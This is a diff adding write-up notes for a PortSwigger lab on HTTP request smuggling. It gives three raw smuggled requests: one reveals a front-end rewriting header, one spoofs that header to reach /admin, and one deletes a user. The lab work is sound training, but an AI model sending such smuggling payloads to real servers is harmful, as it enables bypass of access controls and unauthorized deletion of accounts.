@@ -212,6 +212,81 @@ Now let's see how we can chain this vulnerability to induce XSS in the victim's 
 
 From <https://infosecwriteups.com/http-request-smuggling-explained-and-exploited-part-0x3-b61623287603> 
 
+**Exploiting HTTP request smuggling to reveal front-end request rewriting**
+front-end and back-end server, and the front-end server doesn't support chunked encoding.
+
+From <https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting> 
+
+Intercept request and change to post
+Our response should have search result for follow by the rewritten http request
+
+```
+POST / HTTP/1.1
+Host: 0ade004c03eb044e80bb21c40037006f.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 124
+Transfer-Encoding: chunked
+
+0
+
+POST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 200
+Connection: close
+
+search=test
+```
+
+Make note of  `x-nDBWAo` header 
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/a09771a0-9fb8-4147-ba3a-f0e53e69f265)
+
+
+
+
+
+Our exploit to get admin
+```
+POST / HTTP/1.1
+Host: 0ade004c03eb044e80bb21c40037006f.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 147
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+X-nDBWAo-Ip: 127.0.0.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+Connection: close
+
+x=1
+```
+
+
+We can now delete the user
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/c7f5346a-3229-42db-89aa-1ac2cf9131fa)
+
+
+
+
+```
+POST / HTTP/1.1
+Host: 0ade004c03eb044e80bb21c40037006f.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 170
+Transfer-Encoding: chunked
+
+0
+
+GET /admin/delete?username=carlos HTTP/1.1
+X-nDBWAo-Ip: 127.0.0.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+Connection: close
+
+x=1
+```
 
 
 
